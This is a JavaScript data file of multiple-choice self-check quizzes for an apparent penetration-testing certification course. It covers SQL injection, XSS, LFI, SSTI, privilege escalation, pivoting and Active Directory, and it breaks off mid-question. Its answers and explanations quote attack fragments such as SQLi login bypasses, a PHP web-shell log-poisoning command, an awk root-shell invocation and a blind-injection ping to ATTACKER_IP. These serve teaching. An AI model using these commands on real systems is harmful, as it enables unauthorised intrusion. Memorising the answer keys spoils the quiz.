/**
 * Self-check questions, keyed by lesson id from lib/curriculum.js.
 *
 * Every question is drawn from the lesson it sits under — the gotchas, the
 * decision points and the "why this flag" moments, not trivia. The `why` is
 * the point: a wrong answer should teach, so it is shown either way.
 *
 * Web module first, because that is the heaviest-weighted PT1 domain
 * (400 of 1000 points).
 *
 * Pure data + pure functions.
 */

export const PASS_PCT = 80

export const QUIZZES = {
  // ── web/00 — How the web works ────────────────────────────────────────
  'web-00': [
    {
      q: 'Which of these attacks abuses code running in the victim’s browser rather than on the server?',
      options: ['SQL injection', 'SSTI', 'XSS', 'Command injection'],
      answer: 2,
      why: 'XSS is client-side: the payload executes in the victim’s browser. SQLi, SSTI and command injection all abuse code running server-side, which is why you can never see their source directly.'
    },
    {
      q: 'Where does a POST request carry its parameters?',
      options: [
        'In the URL, after the ?',
        'In the request body',
        'In the Cookie header',
        'In the response headers'
      ],
      answer: 1,
      why: 'GET puts parameters in the URL query string, so they show in history and logs. POST puts them in the body — which is exactly why you need Burp (or -r with sqlmap) to see and edit them.'
    },
    {
      q: 'During content discovery you get a 403 on /admin. What has it told you?',
      options: [
        'The path does not exist',
        'The path exists but you are not allowed it',
        'The server crashed',
        'You were redirected'
      ],
      answer: 1,
      why: '403 is "exists but forbidden" — far more interesting than 404. It confirms the resource is really there, which makes it a candidate for a vertical access-control bypass.'
    },
    {
      q: 'In a PHP snippet, what is `$_GET[\'q\']` doing?',
      options: [
        'Setting a cookie named q',
        'Reading the URL parameter named q',
        'Running a database query',
        'Defining a function called q'
      ],
      answer: 1,
      why: '$_GET is PHP reading a URL query parameter. Spotting server code that reads your input, unfiltered, is the whole tell for injection — you do not need to write PHP, only recognise it.'
    },
    {
      q: 'What actually makes a web app recognise you across requests?',
      options: [
        'Your IP address',
        'The User-Agent header',
        'A session cookie sent with each request',
        'The URL path'
      ],
      answer: 2,
      why: 'HTTP is stateless. The server hands out a session cookie and the browser returns it on every request — which is why stealing that cookie (stored XSS) is equivalent to stealing the account.'
    }
  ],

  // ── web/01 — SQL injection ────────────────────────────────────────────
  'web-01': [
    {
      q: 'Why do you write `-- -` instead of plain `--` in a URL-based SQLi payload?',
      options: [
        '`-- -` is the only comment MySQL accepts',
        'SQL needs whitespace after `--`, and a URL often strips a trailing space',
        'The extra dash escapes the quote',
        'It stops the WAF seeing the comment'
      ],
      answer: 1,
      why: 'SQL requires a space after `--` for it to count as a comment. A trailing space in a URL gets stripped or ignored, so you add a character after it — `-- -` or `-- +` — to keep the space real. This one eats hours.'
    },
    {
      q: 'You are counting columns for a UNION. Why is `ORDER BY n` usually cleaner than `UNION SELECT NULL,NULL,…`?',
      options: [
        'It is faster to type',
        'It fails with a specific error naming the column, so you can binary-search the count',
        'UNION SELECT does not work on MySQL',
        'ORDER BY bypasses WAFs'
      ],
      answer: 1,
      why: 'ORDER BY n errors the moment n passes the real column count, with a precise message ("Unknown column \'n\' in \'order clause\'"), so you binary-search it. UNION SELECT NULL gives a generic mismatch error that is easy to misread as "not injectable."'
    },
    {
      q: 'Why does `admin\' -- -` in a username field log you in without the password?',
      options: [
        'It matches a row where the password is empty',
        'It closes the username string and comments out the AND password clause',
        'It disables authentication on the server',
        'It sets the admin flag to true'
      ],
      answer: 1,
      why: 'The quote closes the username string so it matches the admin row, then the comment removes the rest of the query — including ` AND password = \'…\'`. The password is never compared. Root cause: input concatenated into the query with no parameterisation.'
    },
    {
      q: 'In a dump payload, what is `0x3a` doing next to `group_concat`?',
      options: [
        'Limiting the row count',
        'Hex for a colon, used as a readable separator between fields',
        'Casting the result to an integer',
        'Encoding the payload to bypass a filter'
      ],
      answer: 1,
      why: 'group_concat mashes many rows into one string; 0x3a is just a hex colon used as a separator so `user:hash` comes back readable. Hex avoids having to include a literal quoted \':\' in the payload.'
    },
    {
      q: 'The injectable parameter is in an authenticated POST. Which sqlmap invocation is the right shape?',
      options: [
        'sqlmap -u with the URL and --level 5',
        'sqlmap -r against a request saved from Burp',
        'sqlmap --os-shell straight away',
        'sqlmap --dump with no target'
      ],
      answer: 1,
      why: '-r reads the entire request from a file — method, body, cookies, headers — which is what a POST behind a login needs. Rebuilding all of that on the command line by hand is where people lose the session and conclude "not injectable."'
    },
    {
      q: 'The query is `WHERE id = $id` with no quotes around the value. What changes?',
      options: [
        'It is not injectable',
        'You need a double quote instead of a single one',
        'You need no quote at all — `1 OR 1=1 -- -` works directly',
        'You must use sqlmap'
      ],
      answer: 2,
      why: 'That is numeric context: there is no string to break out of, so no quote is needed. Matching the quote style — none, single, or double — to the actual query is the first thing to test when a payload "should" work and does not.'
    }
  ],

  // ── web/02 — IDOR & access control ────────────────────────────────────
  'web-02': [
    {
      q: 'A normal user reaches /admin/deleteUser directly by typing the URL. Which is it?',
      options: [
        'Horizontal IDOR',
        'Vertical IDOR — privilege escalation within the app',
        'Stored XSS',
        'Not a finding, just a UI bug'
      ],
      answer: 1,
      why: 'Vertical means reaching a higher-privilege function; horizontal means reaching a peer\'s data at your own level. The missing control here is a server-side role check on the route — the app hid the link but never enforced the permission.'
    },
    {
      q: 'What is the tell that a parameter is worth testing for IDOR?',
      options: [
        'It is sent over POST',
        'It looks like a database row — sequential integer, UUID, or a name like invoice_004.pdf',
        'It appears in the Cookie header',
        'It is URL-encoded'
      ],
      answer: 1,
      why: 'Any value that identifies an object and that you control is a candidate. Change it; if someone else\'s thing comes back, that is the finding — no special tooling, just attention while you browse.'
    },
    {
      q: 'You have confirmed you can read one other user\'s profile. Why enumerate a range with ffuf next?',
      options: [
        'To find the admin password',
        'To prove scope — that it is every user, not a one-off',
        'To bypass rate limiting',
        'Because ffuf is faster than Burp'
      ],
      answer: 1,
      why: 'The exam and the report both reward showing impact. "I read user 1301" is an anecdote; "every id from 1300-1310 returns another account" is a quantified finding, and severity follows scope.'
    },
    {
      q: 'Why does a write-IDOR usually outrank a read-IDOR in severity?',
      options: [
        'It is harder to find',
        'It modifies other users’ objects, so it often means account takeover rather than disclosure',
        'It always gives you a shell',
        'It affects more parameters'
      ],
      answer: 1,
      why: 'Read-IDOR discloses data (typically medium). Write-IDOR lets you change an object you do not own — change an email or password on someone else\'s account and you have taken it over, which is commonly critical.'
    },
    {
      q: 'When testing horizontal IDOR, what must stay unchanged?',
      options: [
        'The object id',
        'Your own session cookie',
        'The HTTP method',
        'The User-Agent'
      ],
      answer: 1,
      why: 'You change the id and keep your own session. That is what proves the server authorised on the supplied id alone and never checked the object belongs to your session. Swap the cookie too and you have proven nothing.'
    }
  ],

  // ── web/03 — XSS ──────────────────────────────────────────────────────
  'web-03': [
    {
      q: 'What is the root cause you should write in the remediation for any XSS?',
      options: [
        'Input was not sanitised',
        'Output was not encoded for the context it landed in',
        'The WAF was misconfigured',
        'Cookies were missing the Secure flag'
      ],
      answer: 1,
      why: 'Every XSS is output encoding failing for its context — HTML body, attribute, JS, URL each need different encoding. "Sanitise input" is the answer that sounds right and gets marked down; context-aware output encoding is the fix.'
    },
    {
      q: 'Your payload reflects inside `value="HERE"` and a plain `<script>` does nothing. Why?',
      options: [
        'The browser blocked it with CSP',
        'It is inside a quoted attribute, so the browser reads it as text, not markup',
        'Script tags never work in reflected XSS',
        'The server stripped it'
      ],
      answer: 1,
      why: 'Inside an attribute value the tag is just characters. You break out first: `"><script>alert(document.domain)</script>` — the `">` closes the value and the tag, dropping you back into HTML where a script tag is real markup.'
    },
    {
      q: 'Why probe with `<u>test123</u>` before firing `<script>`?',
      options: [
        'Script tags are usually blacklisted',
        'It proves HTML is being interpreted, with a benign payload that will not trip alerts',
        'It is required to find stored XSS',
        'It bypasses HttpOnly'
      ],
      answer: 1,
      why: 'If the text renders underlined, your input is being parsed as markup — that is the confirmation. Escalate to script only after. Working benign-first also keeps you honest about what you actually proved.'
    },
    {
      q: 'Why does stored XSS outrank reflected XSS?',
      options: [
        'It is harder to fix',
        'It fires for every user who loads the page, with no need to deliver a link',
        'It works without JavaScript',
        'It cannot be filtered'
      ],
      answer: 1,
      why: 'Reflected XSS needs the victim to follow your crafted URL. Stored sits in the app and executes for anyone who views the page — including an admin — so it needs no social engineering and hits far more people.'
    },
    {
      q: 'Which control would have stopped the cookie-stealing payload specifically?',
      options: [
        'HttpOnly on the session cookie',
        'The Secure flag',
        'SameSite=Lax',
        'Rate limiting'
      ],
      answer: 0,
      why: 'HttpOnly hides the cookie from document.cookie, so JavaScript cannot read it. Secure only forces HTTPS and SameSite only limits cross-site sending — neither blocks a script reading the value on the page itself. CSP is the broader fix.'
    }
  ],

  // ── web/04 — Upload, LFI, command injection ───────────────────────────
  'web-04': [
    {
      q: 'You prepend `GIF89a;` to a PHP web shell and set Content-Type: image/gif. Which check is that defeating?',
      options: [
        'The extension blacklist',
        'The magic-byte / content-type check that tries to prove the file is an image',
        'The file size limit',
        'The antivirus scanner'
      ],
      answer: 1,
      why: 'GIF89a is the GIF magic header, so a check that sniffs the first bytes is satisfied while the PHP after it still executes. It does nothing about the extension — you still need one the server maps to the PHP handler, like .phtml.'
    },
    {
      q: 'What does `?page=php://filter/convert.base64-encode/resource=config` get you?',
      options: [
        'Remote code execution',
        'The base64-encoded source of config.php, to decode and read',
        'A directory listing',
        'A reverse shell'
      ],
      answer: 1,
      why: 'The filter wrapper returns the file base64-encoded instead of executing it, so PHP source comes back readable rather than running. Decode it and you usually find DB credentials or the next include path.'
    },
    {
      q: 'A parameter reaches a shell but nothing is echoed back. How do you confirm injection?',
      options: [
        'Run `id` and check the page source',
        'Inject `; sleep 5` and see whether the response takes about five seconds',
        'Try a different parameter',
        'Use sqlmap'
      ],
      answer: 1,
      why: 'That is blind command injection: with no output channel you need a side channel. A timing delay proves execution; so does forcing a callback — `ping ATTACKER_IP` watched with `tcpdump -i tun0 icmp`.'
    },
    {
      q: 'In log poisoning, what is `curl -A \'<?php system($_GET["c"]); ?>\'` for?',
      options: [
        'Uploading a file',
        'Writing PHP into the access log via the User-Agent, so an LFI can then include and run it',
        'Reading the log file',
        'Bypassing the extension check'
      ],
      answer: 1,
      why: 'The server records your User-Agent verbatim in its access log. Point the LFI at that log and PHP inside it gets executed on include — that is the standard route from file-read to code execution.'
    },
    {
      q: 'Why is RFI rare on modern targets?',
      options: [
        'Browsers block it',
        'It needs allow_url_include=On, which is off by default now',
        'It only works on Windows',
        'PHP removed the include function'
      ],
      answer: 1,
      why: 'RFI pulls a file from a URL you control, which needs allow_url_include enabled. It ships off, so on current boxes you expect LFI and reach code execution via log poisoning or a wrapper instead.'
    }
  ],

  // ── web/05 — SSTI ─────────────────────────────────────────────────────
  'web-05': [
    {
      q: 'You send `{{7*7}}` and the page shows `49`. What have you proven?',
      options: [
        'The engine is Jinja2',
        'Your input is being evaluated by a `{{ }}` template engine',
        'You have remote code execution',
        'The app is written in PHP'
      ],
      answer: 1,
      why: 'Arithmetic being computed proves evaluation, not which engine. Jinja2 and Twig both use `{{ }}` — fingerprinting is the next step, and the payload differs completely between them.'
    },
    {
      q: '`{{7*\'7\'}}` returns `7777777`. Which engine is it?',
      options: ['Twig (PHP)', 'Freemarker (Java)', 'Jinja2 (Python)', 'ERB (Ruby)'],
      answer: 2,
      why: 'Python repeats a string when you multiply it by an integer, so 7*\'7\' is \'7777777\'. Twig would error on the same input. That single probe splits the two `{{ }}` engines apart.'
    },
    {
      q: 'Why must you check the raw HTTP response rather than the rendered page?',
      options: [
        'The browser caches the page',
        'If `49` only appears after JavaScript runs, it is client-side templating — a different bug',
        'The DOM hides script tags',
        'curl encodes the response differently'
      ],
      answer: 1,
      why: 'Server-side evaluation means 49 is already in the bytes the server sent. If it only becomes 49 after JS executes, the template ran in the browser — client-side template injection, which does not give you RCE on the server.'
    },
    {
      q: '`${7*7}` comes back as the literal text `${7*7}`. What does that tell you?',
      options: [
        'The app is not vulnerable',
        'It rules out the `${}` engines such as Freemarker',
        'The filter stripped your payload',
        'You need to URL-encode it'
      ],
      answer: 1,
      why: 'A probe returned literally is still evidence — it rules an engine out. Fingerprinting is elimination: run the `{{ }}`, `${}` and `#{}` probes and let the ones that evaluate tell you which family you are in.'
    },
    {
      q: 'Why is SSTI usually reported as Critical?',
      options: [
        'It is difficult to detect',
        'It commonly gives direct command execution on the server',
        'It affects every user of the app',
        'It cannot be patched'
      ],
      answer: 1,
      why: 'Once you climb out of the sandbox, SSTI hands you code execution as the web user — the same outcome as a web shell. Severity follows impact, and RCE is the top of that scale.'
    }
  ],

  // ── web/06 — Burp workflow ────────────────────────────────────────────
  'web-06': [
    {
      q: 'Which Burp tool reads a boolean-blind result for you?',
      options: ['Intruder', 'Decoder', 'Comparer', 'Repeater'],
      answer: 2,
      why: 'Comparer diffs two responses. The true and false cases of a blind injection often differ by a handful of bytes you would never spot by eye — that delta is the signal you extract data one yes/no question at a time with.'
    },
    {
      q: 'You enumerate an id range in Intruder. What identifies the IDOR hit?',
      options: [
        'The status code changing to 500',
        'Sorting by response Length and finding the outlier',
        'The slowest response',
        'A different Content-Type'
      ],
      answer: 1,
      why: 'A record that exists returns different data, so its response length is different. Sort by Length and the outlier is your hit — status codes are often uniformly 200 whether the object exists or not.'
    },
    {
      q: 'Where does the core web-testing loop happen?',
      options: [
        'Scanner',
        'HTTP history → send to Repeater → edit and resend',
        'Intruder → Sniper',
        'Target → Site map only'
      ],
      answer: 1,
      why: 'Browse with the proxy on, find the interesting request in HTTP history, send it to Repeater, then change one thing at a time and resend. Everything else in Burp is an accelerator on top of that loop.'
    },
    {
      q: 'Fastest way to get Burp proxying HTTPS with no certificate errors?',
      options: [
        'Disable TLS verification in the browser',
        'Use Burp’s built-in browser, which needs no configuration',
        'Install a new certificate on the target',
        'Proxy over HTTP only'
      ],
      answer: 1,
      why: 'The embedded browser is pre-trusted, so it is zero setup. The alternative is importing Burp\'s CA cert into Firefox from http://burp — worth knowing, but not the fast path when the clock is running.'
    },
    {
      q: 'Which probes belong in Repeater on a single reflected parameter?',
      options: [
        'Only a single quote',
        '`\'` for SQLi, a marker then `<b>marker</b>` for XSS, and `{{7*7}}` for SSTI',
        'A full wordlist of payloads',
        'A reverse shell one-liner'
      ],
      answer: 1,
      why: 'One parameter, three cheap probes, and you record which context the reflection landed in — between tags, inside an attribute, or in JavaScript. That context dictates the payload; guessing payloads without it is flailing.'
    }
  ],
// ── network/01 — Recon & enumeration ──────────────────────────────────
  'network-01': [
    {
      q: 'Why does the first scan on every box use `-p-` instead of plain `nmap 10.10.x.x`?',
      options: [
        'It scans faster',
        'It scans all 65535 ports; the default only covers the top 1000',
        'It enables version detection',
        'It scans UDP as well as TCP'
      ],
      answer: 1,
      why: 'Default nmap reads the top 1000 TCP ports. Exam boxes love a service on 3333, 8080 or 8443 — outside that list. Concluding "only 80 is open" from a default scan is the single most common way to lose an hour.'
    },
    {
      q: 'What does the pair `-sC -sV` add to a scan of the open ports?',
      options: [
        'Stealth and speed',
        'A UDP sweep and OS fingerprinting',
        'Default NSE enumeration scripts, plus service version detection',
        'Output to a file in three formats'
      ],
      answer: 2,
      why: '-sC runs the safe default NSE scripts (banners, anonymous FTP, SMB shares, HTTP titles) and -sV pins the version. "Apache 2.4.49" versus a bare "http" is the difference between a searchsploit hit and a dead end.'
    },
    {
      q: 'ffuf returns 403 on a path. Why keep it rather than filter it out?',
      options: [
        'A 403 means the server is misconfigured',
        'It proves the resource exists — you are only blocked from it',
        '403 responses always contain the flag',
        'It means the wordlist is wrong'
      ],
      answer: 1,
      why: '404 is "nothing here"; 403 is "here, but not for you". That confirmed existence makes it a candidate for an access-control bypass, which is why -mc 200,301,302,403 keeps them.'
    },
    {
      q: 'When fuzzing virtual hosts with `-H "Host: FUZZ.target.thm"`, what is `-fs 4242` for?',
      options: [
        'It limits the scan to 4242 requests',
        'It sets the request timeout',
        'It filters out responses matching the default page’s byte size',
        'It fuzzes port 4242 as well'
      ],
      answer: 2,
      why: 'Every non-existent vhost returns the same default page, so every word "matches". You measure that page’s size first and filter it, leaving only the vhosts that respond differently.'
    },
    {
      q: 'You have `-sV` output showing `vsftpd 2.3.4`. What is the immediate next command?',
      options: [
        'hydra against FTP with rockyou',
        'searchsploit vsftpd 2.3.4',
        'nmap -sU on the host',
        'ffuf against the FTP port'
      ],
      answer: 1,
      why: 'searchsploit is the offline Exploit-DB search on Kali — no internet needed, instant answer. Match the version exactly before trusting the PoC; off-by-one versions frequently are not vulnerable.'
    },
    {
      q: 'Which open port is the reminder that you still owe the box a UDP scan?',
      options: ['3389 RDP', '5985 WinRM', '161/udp SNMP', '3128 proxy'],
      answer: 2,
      why: 'SNMP on 161/udp is invisible to a TCP scan and is the classic skipped easy win — it leaks processes, usernames and sometimes plaintext credentials. `nmap -sU --top-ports 20` costs a minute.'
    }
  ],

  // ── network/02 — Service exploitation & shells ────────────────────────
  'network-02': [
    {
      q: 'What is `nxc smb 10.10.x.x -u \'\' -p \'\' --shares` actually asking the target?',
      options: [
        'Brute force the SMB password',
        'List the shares over a null session, with your access level on each',
        'Mount every share locally',
        'Dump the domain users'
      ],
      answer: 1,
      why: 'Empty user and empty password is a null session. If the box answers, it is handing you its share list and READ/WRITE flags for free — before you have a single credential.'
    },
    {
      q: 'In `hydra ... http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"`, what is the third field?',
      options: [
        'The string that appears when a login succeeds',
        'A comment for your notes',
        'The string that appears when a login fails',
        'The redirect target after login'
      ],
      answer: 2,
      why: 'Hydra needs a failure marker to tell wrong from right — anything not containing it is treated as a hit. Get the exact body and that exact string out of Burp first, or every attempt looks identical.'
    },
    {
      q: 'You catch a raw `nc` shell. What is the first thing you do in it?',
      options: [
        'cat the user flag',
        'Run linpeas',
        'Stabilise it: pty.spawn, Ctrl-Z, `stty raw -echo; fg`, `export TERM=xterm`',
        'Add your SSH key'
      ],
      answer: 2,
      why: 'A raw nc shell has no job control, no tab completion, and Ctrl-C kills it outright. Losing it mid-`sudo` costs you the whole foothold. Stabilise before you do anything you would hate to repeat.'
    },
    {
      q: 'What does `-n` do in `nc -lvnp 4444`?',
      options: [
        'Sets the number of connections to accept',
        'Skips DNS resolution',
        'Runs in the background',
        'Enables netcat’s -e execute mode'
      ],
      answer: 1,
      why: 'It is listen, verbose, no-DNS, port. Skipping resolution avoids a hang while netcat tries to reverse-look-up an address that has no PTR record — a real stall on lab networks.'
    },
    {
      q: 'SNMP is open on 161/udp. What is the community string you try first, and why?',
      options: [
        'private, because it grants write access',
        'admin, because it is the usual default',
        'public, because it is the ubiquitous default read string',
        'The hostname of the target'
      ],
      answer: 2,
      why: '`snmpwalk -v2c -c public IP` costs one command. `public` is the default read community almost everywhere, and the NET-SNMP-EXTEND-MIB objects often spill running script output and credentials.'
    },
    {
      q: 'What should you exhaust before starting a hydra brute force?',
      options: [
        'Kernel exploits',
        'Enumeration for credentials already lying in shares, configs and files',
        'A UDP scan of all 65535 ports',
        'Every wordlist in SecLists'
      ],
      answer: 1,
      why: 'The lesson keeps its own dead end in: twenty minutes brute forcing SSH while the password sat in a readable SMB share. Brute force is slow, noisy and usually unnecessary — enumerate for creds first, then time-box it.'
    }
  ],

  // ── network/03 — Linux privilege escalation ───────────────────────────
  'network-03': [
    {
      q: 'What does `find / -perm -4000 -type f 2>/dev/null` look for?',
      options: [
        'Files owned by root',
        'Files with the SUID bit — they run as their owner, not as you',
        'World-writable files',
        'Files modified in the last 4000 minutes'
      ],
      answer: 1,
      why: 'SUID means the binary executes with its owner’s privileges whoever launches it. An odd one out on that list — a custom program, or find/cp/bash/nmap carrying the bit — is your vector, and GTFOBins has the invocation.'
    },
    {
      q: '`sudo -l` shows `(root) NOPASSWD: /usr/bin/awk`. What makes that root?',
      options: [
        'Running `sudo awk` on /etc/shadow prints the hashes',
        'awk can overwrite /etc/passwd directly',
        'GTFOBins’ specific invocation: `sudo awk \'BEGIN {system("/bin/sh")}\'`',
        'Nothing — awk is a text tool, not a shell'
      ],
      answer: 2,
      why: 'The vector is the binary; the technique is on GTFOBins. awk’s BEGIN block can call system(), and because sudo already granted root, the shell it spawns is root. Running awk "normally" achieves nothing — that dead end is in the lesson.'
    },
    {
      q: 'Your cron payload ran `chmod +s /bin/bash`. Why is the follow-up `/bin/bash -p`?',
      options: [
        'It prints the effective privileges',
        'It keeps the SUID root privileges instead of dropping them',
        'It loads the root profile',
        'It runs bash in POSIX mode'
      ],
      answer: 1,
      why: 'Bash drops elevated privileges on startup unless you ask it not to. Without -p you get a SUID-root binary that hands you back a plain user shell, which looks exactly like the exploit failing.'
    },
    {
      q: 'Where do kernel exploits sit in the privesc order, and why?',
      options: [
        'First, because they are the most reliable',
        'Last, because they can crash the box',
        'Never — they are out of scope on PT1',
        'Second, right after sudo -l'
      ],
      answer: 1,
      why: 'sudo rights, SUID, cron and writable files are surgical. A kernel exploit can panic the host, and on a timed exam a box you have to reset is expensive. Config misconfigurations first, always.'
    },
    {
      q: 'What is `2>/dev/null` doing on the end of those enumeration commands?',
      options: [
        'Running the command in the background',
        'Redirecting output to a file for the report',
        'Discarding stderr so permission-denied noise does not bury the results',
        'Suppressing the exit code'
      ],
      answer: 2,
      why: 'A low-priv `find /` generates thousands of permission-denied lines on stderr. Sending fd 2 to /dev/null leaves only the hits on stdout — the difference between a readable list and a wall of noise.'
    },
    {
      q: 'linPEAS was downloaded to the target and `./linpeas.sh` says "Permission denied". What is missing?',
      options: [
        'You need to be root to run it',
        '`chmod +x linpeas.sh` — a fresh download is not executable',
        'The file must live in /tmp',
        'It needs a shebang added'
      ],
      answer: 1,
      why: 'wget does not set the execute bit. It is a two-second fix that reads like a privilege problem, which is exactly why it wastes time — the lesson calls it out for that reason.'
    }
  ],

  // ── network/04 — Windows privilege escalation ─────────────────────────
  'network-04': [
    {
      q: 'On a Windows foothold, which command do you run before anything else?',
      options: ['systeminfo', 'whoami /priv', 'net user', 'ipconfig /all'],
      answer: 1,
      why: 'Token privileges are often the whole answer. SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege set to Enabled is a direct road to SYSTEM, and it takes one command to find out.'
    },
    {
      q: 'A web shell lands you as `iis apppool\\defaultapppool` with SeImpersonatePrivilege enabled. What is the chain?',
      options: [
        'Dump LSASS with mimikatz and pass the hash',
        'Search for an unquoted service path',
        'PrintSpoofer or GodPotato to impersonate a SYSTEM token',
        'Run a kernel exploit from systeminfo’s missing hotfixes'
      ],
      answer: 2,
      why: 'Web shell → service account → SeImpersonatePrivilege → PrintSpoofer/GodPotato → SYSTEM is the highest-yield Windows chain on exam boxes, and it comes back in the AD module. `PrintSpoofer64.exe -i -c cmd` gives you the shell in the console.'
    },
    {
      q: 'JuicyPotato runs and silently does nothing on a Server 2019 target. What went wrong?',
      options: [
        'The account lacks SeImpersonatePrivilege',
        'It needs to run from an elevated prompt',
        'The CLSID trick it relies on was patched — match the Potato to the OS',
        'Defender blocked it'
      ],
      answer: 2,
      why: 'This dead end is kept in the lesson. JuicyPotato does not work on newer Windows; GodPotato and PrintSpoofer do. On anything modern, reach for those first rather than debugging the old one.'
    },
    {
      q: 'Why is an unquoted service path like `C:\\Program Files\\My App\\svc.exe` exploitable?',
      options: [
        'Windows tries `C:\\Program.exe` first, so a writable earlier segment wins',
        'The service always runs as the logged-in user',
        'Spaces in a path disable file permissions',
        'It lets you rename the service'
      ],
      answer: 0,
      why: 'Without quotes Windows walks the path splitting on spaces, trying each candidate in turn. If you can write to a directory that comes earlier in that walk, your executable is launched instead — as the service account, often SYSTEM.'
    },
    {
      q: 'Which of these is the classic Windows credential freebie worth grepping for early?',
      options: [
        'C:\\Windows\\System32\\config\\SAM',
        '`C:\\Windows\\Panther\\Unattend.xml` and the Winlogon AutoLogon registry keys',
        'The Recycle Bin',
        'C:\\Windows\\Temp'
      ],
      answer: 1,
      why: 'Unattend.xml carries a base64 admin password from the install, and Winlogon’s DefaultUserName/DefaultPassword store AutoLogon creds in the clear. Pair either with `runas /savecred` or evil-winrm and you are done.'
    },
    {
      q: 'You can modify a SYSTEM service’s configuration. How do you turn that into code execution?',
      options: [
        'Delete the service and recreate it',
        '`sc config <service> binpath= "C:\\temp\\rev.exe"` then stop and start it',
        'Change the service description',
        'Set the service to manual start'
      ],
      answer: 1,
      why: 'binpath= is what the service actually executes, and it runs under the service’s own account. Note the space after the equals sign — sc is unforgiving about it. accesschk or PowerUp finds the services you can touch.'
    }
  ],

  // ── network/05 — Pivoting ─────────────────────────────────────────────
  'network-05': [
    {
      q: 'What tells you a compromised host is worth using as a pivot?',
      options: [
        'It is running Windows',
        'It has a second interface or route into a subnet your tun0 cannot reach',
        'It has more than 4GB of RAM',
        'SSH is open on it'
      ],
      answer: 1,
      why: '`ip a` / `ipconfig` showing an interface on, say, 172.16.5.0/24, plus `arp -a` showing hosts it has talked to. That subnet is your next target and this host is the only door into it.'
    },
    {
      q: 'What does Ligolo-ng give you that a SOCKS proxy does not?',
      options: [
        'Encrypted traffic',
        'A route on a tun interface, so every tool works unmodified — no proxychains wrapper',
        'Faster transfer speeds',
        'The ability to run as a non-root user'
      ],
      answer: 1,
      why: 'Once `sudo ip route add 172.16.5.0/24 dev ligolo` is in place, nmap, nxc, evil-winrm and impacket reach the internal subnet as if you were plugged into it. That is why reviewers reach for it on PT1.'
    },
    {
      q: 'Over a chisel SOCKS proxy, why is it `proxychains nmap -sT -Pn` rather than a normal SYN scan?',
      options: [
        'SOCKS only forwards UDP',
        '-sT is faster',
        'SYN scans need raw sockets, which do not traverse a SOCKS tunnel',
        'proxychains rewrites the scan type automatically'
      ],
      answer: 2,
      why: 'A SOCKS proxy carries completed TCP connections, not half-open handshakes. -sT makes a full connect() the proxy can actually relay; -Pn skips the host discovery ping, which also will not survive the tunnel.'
    },
    {
      q: 'You have SSH creds on the pivot and want your whole toolkit to reach the internal subnet. Which flag?',
      options: [
        '`ssh -L 8080:172.16.5.10:80 user@PIVOT`',
        '`ssh -D 1080 user@PIVOT`',
        '`ssh -R 4444 user@PIVOT`',
        '`ssh -N user@PIVOT`'
      ],
      answer: 1,
      why: '-D opens a dynamic SOCKS proxy covering the whole subnet; -L forwards exactly one internal port to one local port. Use -L when you want one web app in your browser, -D when you want to scan.'
    },
    {
      q: 'The Ligolo route is added but nothing reaches the internal subnet. What is the usual cause?',
      options: [
        'The subnet mask is wrong',
        'The agent session was never selected and started in the Ligolo console',
        'The proxy needs to run as root',
        'The route must be added before the agent connects'
      ],
      answer: 1,
      why: 'Another dead end kept in: adding the route is not enough, the tunnel has to be active. In the console, `session`, pick it, start it — then prove it with a single nmap before firing your whole toolkit at it.'
    },
    {
      q: 'What is a Ligolo `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` for?',
      options: [
        'Scanning port 4444 across the internal subnet',
        'Making the pivot listen on 4444 and forward back to your listener, so internal hosts can reach you',
        'Blocking port 4444 on the pivot',
        'Encrypting traffic on port 4444'
      ],
      answer: 1,
      why: 'An internal machine cannot dial your Kali box directly — it has no route to you. The reverse port forward makes the pivot the visible listener and pipes the connection home through the tunnel.'
    }
  ],
// ── active-directory/01 — Fundamentals & enumeration ──────────────────
  'ad-01': [
    {
      q: 'In one sentence, what is a TGT and what do you do with it?',
      options: [
        'A ticket for one specific service, which you crack offline',
        'A master ticket proving you authenticated, which you exchange for service tickets',
        'The stored form of a password',
        'The permission list on an AD object'
      ],
      answer: 1,
      why: 'The KDC hands you a TGT after you prove you know your password. You then present it to ask for a TGS — a ticket for one service. Forging a TGT with the krbtgt key is a Golden Ticket.'
    },
    {
      q: 'nxc reports `[+]` on one host and `(Pwn3d!)` on another. What is the difference?',
      options: [
        'No difference — both mean the login worked',
        '`[+]` means valid credential; `(Pwn3d!)` means it is local admin there',
        '`[+]` means the host is up; `(Pwn3d!)` means SMB signing is off',
        '`(Pwn3d!)` means the password was cracked'
      ],
      answer: 1,
      why: 'That distinction decides whether you can dump credentials or get a shell on the host. Lesson 4 keeps the dead end in: psexec failing with ACCESS_DENIED because the account was `[+]` but never `(Pwn3d!)`.'
    },
    {
      q: 'Why run `--pass-pol` before you password-spray a domain?',
      options: [
        'It reveals the domain administrator’s password',
        'It lists the service accounts worth roasting',
        'It shows the lockout threshold, so you know how hard you can spray',
        'It is required before nxc will authenticate'
      ],
      answer: 2,
      why: 'Spraying past the lockout threshold locks out real accounts — noisy, disruptive, and on an engagement a genuine problem. Read the policy, then stay under it.'
    },
    {
      q: 'A Kerberos attack fails with `KRB_AP_ERR_SKEW`. What do you check first?',
      options: [
        'The wordlist path',
        'That the exploit matches the Windows version',
        'Your clock against the DC, and /etc/hosts',
        'Whether the account is locked out'
      ],
      answer: 2,
      why: 'Kerberos tolerates about five minutes of drift. The lesson keeps in fifteen minutes lost to an eight-minute clock offset — `sudo ntpdate <DC>` fixed it instantly. On any weird Kerberos failure, check time and name resolution before the attack itself.'
    },
    {
      q: 'You have no credentials at all. Which route needs only a valid username?',
      options: [
        'Kerberoasting',
        'AS-REP roasting against accounts with pre-authentication disabled',
        'DCSync',
        'Pass-the-hash'
      ],
      answer: 1,
      why: 'With pre-auth disabled, the KDC hands out an AS-REP encrypted with the account’s key to anyone who asks. That is why a leaked user list from a null session is worth so much — it is directly roastable.'
    },
    {
      q: 'Why does `bloodhound-python -ns 10.10.x.x` point the nameserver at the DC?',
      options: [
        'To speed up the collection',
        'Because AD is DNS-driven and the DC is the domain’s nameserver',
        'To avoid triggering alerts',
        'Because the tool cannot take an IP for -d'
      ],
      answer: 1,
      why: 'AD resolves everything through its own DNS. Point at the wrong resolver and collection returns zero or near-zero objects — which reads like an empty domain instead of a config mistake.'
    }
  ],

  // ── active-directory/02 — Kerberoasting & AS-REP ──────────────────────
  'ad-02': [
    {
      q: 'What exactly does Kerberoasting request, and why is it crackable?',
      options: [
        'The user’s TGT, encrypted with the domain key',
        'A TGS for an SPN account, encrypted with that service account’s password key',
